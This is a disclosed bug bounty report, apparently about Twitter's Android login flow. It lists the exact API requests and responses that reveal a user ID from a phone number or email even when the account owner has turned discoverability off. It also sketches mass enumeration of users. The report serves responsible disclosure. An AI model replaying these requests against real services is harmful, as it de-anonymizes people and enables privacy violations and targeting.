# Discoverability by phone number/email restriction bypass

## Report Details
- **Report ID**: 1439026
- **URL**: https://hackerone.com/reports/1439026
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-01-01T15:36:54.795Z
- **Disclosed**: 2022-02-11T17:00:31.711Z

## Reporter
- **Username**: zhirinovskiy
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
**Summary:** By using this vulnerability an attacker can find a twitter account by it's phone number/email even if the user has prohibited this in the privacy options.

**Description:** The vulnerability allows any party  without any authentication to obtain a **twitter ID**(which is almost equal to getting the username of an account) of **any** user by submitting a phone number/email even though the user has **prohibitted this action in the privacy settings**. The bug exists due to the proccess of authorization used in the Android Client of Twitter, specifically in the procces of checking the duplication of a Twitter account.

## Steps To Reproduce:

In this example I will show you how to get a Twitter ID of a user with an email "████████" (this an account created by me to demonstrate this bug)
  0.Disable discoverability in your Twitter account settings 
  1. At first we create a LoginFlow by sending a POST request to 
https://api.twitter.com/1.1/onboarding/task.json?flow_name=login

Headers (stay the same for all the requests):
>User-Agent: ████ (████)
>Accept-Encoding: gzip, deflate
>Authorization: Bearer ███████
>X-Guest-Token: █████ __#This value changes dynamically and must be generated every once in a while__
>Accept: application/json
>X-Twitter-Client: TwitterAndroid
>System-User-Agent: ██████
>Content-Encoding: application/json
>Content-Type: application/json
>Accept-Language: en-US

Body:
>{"flow_token":null,"input_flow_data":{"country_code":null,"flow_context":{"start_location":{"location":"deeplink"}},"requested_variant":null,"target_user_id":0}}

Response:
>{"flow_token":"**██████**","status":"success","subtasks":[{"subtask_id":"LoginEnterUserIdentifier","enter_text":{"primary_text":{"text":"To get started, first enter your phone, email, or @username","entities":[]},"hint_text":"Phone, email, or username","multiline":false,"auto_capitalization_type":"none","auto_correction_enabled":false,"os_content_type":"username","keyboard_type":"text","next_link":{"link_type":"task","link_id":"next_link","label":"Next"},"skip_link":{"link_type":"subtask","link_id":"forget_password","label":"Forgot password?","subtask_id":"RedirectToPasswordReset"}},"subtask_back_navigation":"cancel_flow"},{"subtask_id":"RedirectToPasswordReset","open_link":{"link":{"link_type":"deep_link_and_abort","link_id":"password_reset_deep_link","url":"twitter://onboarding/task?flow_name=password_reset&input_flow_data=%7B%22requested_variant%22%3A%███%22%7D"}}}]}

As you can see we have aquired the flow token value which is used in the next request.

2.  Send a POST request to https://api.twitter.com/1.1/onboarding/task.json with the same headers and a flow token aquired in the previous response

Body:
>{"flow_token":"██████","subtask_inputs":[{"enter_text": {"suggestion_id":null, "text": "**█████████**", "link": "next_link"},
                           "subtask_id": "LoginEnterUserIdentifier"}]}

Response:
>{"flow_token":"████","status":"success","subtasks":[{"subtask_id":"AccountDuplicationCheck","check_logged_in_account":{"true_link":{"link_type":"task","link_id":"AccountDuplicationCheck_true"},"false_link":{"link_type":"task","link_id":"AccountDuplicationCheck_false"},"user_id":"**███**"}}]}
As you can see we have aquired the user ID which can then be used  to get the **full info** about the twitter account (there are many ways to do this), even though I have **disabled discoverability** in my user settings! 

## Impact: 
This is a serious threat, as people can not only find users who have restricted the ability to be found by email/phone number, but any attacker with a basic knowledge of scripting/coding can enumerate a big chunk of the Twitter user base unavaliable to enumeration prior (**create a database with phone/email to username connections**). Such bases can be sold to malicious parties for advertising purposes, or for the purposes of tageting celebrities in different malicious activities
Also a cool feature that I discoverd is that you can even find the id's of suspended Twitter accounts using this method.

## Supporting Material/References:

  * ██████ A simple console Python script that demonstrates this vulnerabilty (requires the requests library to run)

## Impact

This is a serious threat, as people can not only find users who have disbaled discoverability by email/phone number, but any attacker with a basic knowledge of scripting/coding can enumerate a big chunk of the Twitter user base unavaliable to enumeration prior (create a database with phone/email to username connections). Such bases can be sold to malicious parties for advertising purposes, or for the purposes of tageting celebrities in different malicious activities. 
**Short: this can lead to a loss of privacy for many users.**

## Attachments
No attachments
